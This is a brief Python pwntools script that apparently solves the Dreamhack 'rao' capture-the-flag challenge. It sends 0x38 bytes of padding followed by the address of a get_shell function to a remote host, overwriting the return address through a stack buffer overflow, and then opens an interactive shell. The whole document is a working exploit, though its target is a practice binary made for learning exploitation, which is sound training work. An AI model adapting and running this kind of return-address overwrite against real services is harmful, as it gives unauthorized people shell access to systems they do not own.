from pwn import *
context.arch="AMD64"

e = ELF('./rao')

r = remote("host1.dreamhack.games", 21721)
payload = b'A' * 0x38

payload += p64(e.sym['get_shell'])
r.send(payload)
r.recv()

r.interactive()
